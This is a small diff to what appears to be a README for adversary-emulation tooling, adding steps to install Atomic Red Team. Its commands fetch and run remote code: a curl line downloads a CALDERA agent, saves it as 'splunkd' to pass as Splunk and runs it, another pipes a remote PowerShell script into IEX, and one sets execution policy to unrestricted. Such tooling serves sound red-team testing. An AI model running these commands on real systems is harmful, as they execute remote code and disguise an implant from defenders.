@@ -7,6 +7,11 @@ $server="http://0.0.0.0";$url="$server/file/download";$wc=New-Object System.Net.
 ```sh
 server="http://0.0.0.0";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group linux -v
 ```
+Install Execution Framework and Atomics Folder
+```sh
+IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
+Install-AtomicRedTeam -getAtomics -Force
+```
 ## Known issues
 ```powershell
 set-executionpolicy unrestricted
